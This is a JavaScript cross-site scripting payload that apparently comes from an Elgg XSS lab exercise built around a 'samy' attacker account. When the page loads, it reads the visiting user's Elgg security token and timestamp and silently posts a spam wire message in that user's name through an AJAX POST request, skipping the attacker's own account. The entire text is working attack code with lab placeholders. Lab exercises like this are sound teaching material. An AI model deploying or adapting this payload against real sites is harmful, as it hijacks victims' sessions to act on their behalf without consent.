//<script type="text/javascript">

window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" +elgg.security.token.__elgg_token;
	
	var ownerID = elgg.session.user.guid;

	var samyID = 47;
	//Construct the content of your url.

	//posting in wire will generate a post request with this url.
    var sendurl = "http://www.xsslabelgg.com/action/thewire/add"; //FILL IN

	var content = ""//FILL IN

	content += token + ts 


	//adding key-value pairs to the content
	//&key=value
	//this conent will be passed as the body of the post request.
	content += "&body=To earn 12 USD/Hour(!), visit now " + "http://www.xsslabelgg.com/profile/samy";
	
	//content += "__elgg_token"


	//block samy from posting in the wire if he vistis profile himself
	if(ownerID != samyID)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}

//</script>